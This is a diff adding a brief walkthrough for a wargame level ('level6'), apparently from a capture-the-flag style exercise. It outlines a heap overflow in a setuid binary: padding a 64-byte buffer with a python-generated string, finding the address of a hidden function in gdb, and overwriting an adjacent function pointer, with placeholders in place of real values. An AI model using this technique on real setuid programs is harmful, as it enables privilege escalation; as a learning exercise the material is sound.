@@ -1,0 +1,28 @@
+level6 walkthrough
+==================
+
+1. 
+$ ls -l
+-rwsr-s---+ 1 level7 users  5274 Mar  6  2016 level6
+
+
+2.
+$ ./level6
+Segmentation fault (core dumped)
+$ ./level6 <argument>
+Nope
+
+3. ghidra usage 
+
+find that can change a func_ptr address to call n function
+
+4. ./level6 $(python -c 'print "A"* <offset>')
+there is 64 byte malloc for buffer and 4-8 byte malloc for func_ptr
+find the offset
+
+5. gdb ./level6
+info functions n
+get the address of n function
+
+6. 
+$ ./level6 <valuechange.txt>
